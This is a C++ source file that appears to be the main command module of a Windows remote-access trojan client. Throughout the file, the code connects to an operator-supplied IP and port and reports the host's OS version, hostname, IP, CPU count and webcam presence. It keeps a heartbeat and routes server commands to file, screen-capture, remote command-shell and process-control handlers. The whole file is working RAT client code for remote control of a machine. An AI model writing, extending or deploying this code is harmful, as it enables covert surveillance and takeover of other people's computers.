#include "stdafx.h"
#include "MainCommand.h"
#include "ClientSocket.h"
#include "../Common/DataStruct.h"
#include "ShellCommand.h"
#include "FileCommand.h"
#include "ScreenCommand.h"
#include "ProcessCommand.h"

#include <Vfw.h>
#include <VersionHelpers.h>

#pragma comment(lib,"Vfw32.lib")

CMainCommand::CMainCommand(char* szIP, int nPort,bool* IsRun)
{
    m_szIp = szIP;
    m_nPort = nPort;
    m_IsRun = IsRun;
    m_ClientSocket.SetComand(this);
    m_hEvent = ::CreateEvent(NULL, TRUE, FALSE, NULL);
    m_dwLastTime = 0;
    m_HeratThread = INVALID_HANDLE_VALUE;
}

CMainCommand::~CMainCommand()
{
    OutputDebugStringA("Log:~CMainCommand");
    if (m_HeratThread != INVALID_HANDLE_VALUE)
    {
        CloseHandle(m_HeratThread);
        m_HeratThread = INVALID_HANDLE_VALUE;
    }
    CloseHandle(m_hEvent);
}

void CMainCommand::OnRecv(char*  pBuffer, int nSize)
{
    switch (pBuffer[0])
    {
    case COMMAND_DIR:           //文件
    {
        IMyCommand* pFileCommand = new CFileCommand(m_szIp, m_nPort);
        m_ClientThreadPool.PostAddCmd(pFileCommand); //投递到队列
        break;
    }
    case COMMAND_Screen:        //屏幕
    {
        IMyCommand* pScreenCommand = new CScreenCommand(m_szIp, m_nPort);
        m_ClientThreadPool.PostAddCmd(pScreenCommand); //投递到队列
        break;
    }
    case COMMAND_CMD:           //cmd
    {
        IMyCommand* pShellCommand = new CShellCommand(m_szIp, m_nPort); //创建对应的消息处理对象
        m_ClientThreadPool.PostAddCmd(pShellCommand); //投递到队列
        break;
    }
    case COMMAND_PROCESS:       //进程
    {
        IMyCommand* pProcessCommand = new CProcessCommand(m_szIp, m_nPort); //创建对应的消息处理对象
        m_ClientThreadPool.PostAddCmd(pProcessCommand); //投递到队列
        break;
    }
    case COMMAND_HEARTBEAT:       //心跳
    {
        m_dwLastTime = GetTickCount() / 1000;
        Dbgprintf("收到心跳");
        break;
    }
    case COMMAND_Stop:
    {
        *m_IsRun = true;
        m_ClientSocket.OnClose();
        break;
    }
    }
}

void CMainCommand::OnSend(char* pBuffer, int nSize)
{
    m_ClientSocket.OnSend(pBuffer, nSize);
}

void CMainCommand::OnClose()
{
    SetEvent(m_hEvent);
}

unsigned __stdcall CMainCommand::HeratProc(LPVOID lpParam)
{
    CMainCommand* pThis = (CMainCommand*)lpParam;
    char Type = COMMAND_HEARTBEAT;
    DWORD LastTime = 0;
    
    while (true)
    {
        Sleep(500);//不睡会CPU 高
        DWORD CurrTime = GetTickCount() / 1000;
        //先检测本地超时没
        DWORD chazhi = CurrTime - pThis->m_dwLastTime;
        if (chazhi > timeout)
        {
            //超时就退出
            Dbgprintf("心跳超时%d", chazhi);
            return false;
        }
        //间隔10秒发送一次心跳
        if (CurrTime - LastTime > 10)
        {
            pThis->OnSend(&Type, sizeof(char));
            LastTime = GetTickCount() / 1000;
        }
    }
    return true;
}


void CMainCommand::Execute()
{
    DWORD m_dwTickCount = GetTickCount();
    bool bRet = m_ClientSocket.ConnectServer(m_szIp, m_nPort);
    if (!bRet)
    {
        return;
    }
    m_dwSpeed = GetTickCount() - m_dwTickCount;
    //发送登录信息
    SendLoginMessage();
    m_dwLastTime = GetTickCount() / 1000;
    //心跳包线程
    m_HeratThread = (HANDLE)_beginthreadex(NULL, 0, HeratProc, this, 0, NULL);
    if (m_HeratThread == INVALID_HANDLE_VALUE)
    {
        return;
    }
    WaitForSingleObject(m_hEvent, INFINITE);
    OutputDebugStringA("Log:CMainCommand::Execute()执行完毕");
}


bool IsWebCam()
{
    bool	bRet = false;
    TCHAR	lpszName[100], lpszVer[50];
    for (int i = 0; i < 10 && !bRet; i++)
    {
        bRet = capGetDriverDescription(i, lpszName, sizeof(lpszName),
            lpszVer, sizeof(lpszVer));
    }
    return bRet;
}

void CMainCommand::SendLoginMessage()
{
    int nRet = SOCKET_ERROR;
    LOGININFO	LoginInfo;
    // 开始构造数据
    // 登录信息
    LoginInfo.bToken = TOKEN_LOGIN;
    //摄像头
    LoginInfo.bIsWebCam = 0;

    //操作系统
    memset(LoginInfo.szOSver, 0, sizeof(LoginInfo.szOSver));
    char *pszOS = NULL;
    if (IsWindowsServer())
    {
        pszOS = "Windows Server release";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindows8Point1OrGreater())
    {
        pszOS = "Windows 8.1";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindows8OrGreater())
    {
        pszOS = "Windows 8";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindows7SP1OrGreater())
    {
        pszOS = "Windows 7 with SP1";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindows7OrGreater())
    {
        pszOS = "Windows 7";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindowsVistaSP2OrGreater())
    {
        pszOS = "Windows Vista with SP2";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindowsVistaSP1OrGreater())
    {
        pszOS = "Windows Vista with SP1";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindowsVistaOrGreater())
    {
        pszOS = "Windows Vista";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindowsXPSP3OrGreater())
    {
        pszOS = "Windows XP with SP3";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindowsXPSP2OrGreater())
    {
        pszOS = "Windows XP with SP2";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindowsXPSP1OrGreater())
    {
        pszOS = "Windows XP with SP1";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }
    else if (IsWindowsXPOrGreater())
    {
        pszOS = "Windows XP";
        memcpy(LoginInfo.szOSver, pszOS, strlen(pszOS));
    }

    // 主机名
    char hostname[256] = { 0 };
    gethostname(hostname, 256);
    memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
    // IP信息
    sockaddr_in  sockAddr;
    memset(&sockAddr, 0, sizeof(sockAddr));
    int nSockAddrLen = sizeof(sockAddr);
    getsockname(m_ClientSocket.m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

    char* pSzIP = inet_ntoa(sockAddr.sin_addr);
    memset(LoginInfo.szIP, 0, sizeof(LoginInfo.szIP));
    memcpy(LoginInfo.szIP, pSzIP, strlen(pSzIP));

    //获取CPU核心数
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    LoginInfo.CPUClockMhz = systemInfo.dwNumberOfProcessors;

    //摄像头
    LoginInfo.bIsWebCam = IsWebCam();

    // Speed
    LoginInfo.dwSpeed = m_dwSpeed;

    OnSend((char*)&LoginInfo, sizeof(LOGININFO));
}

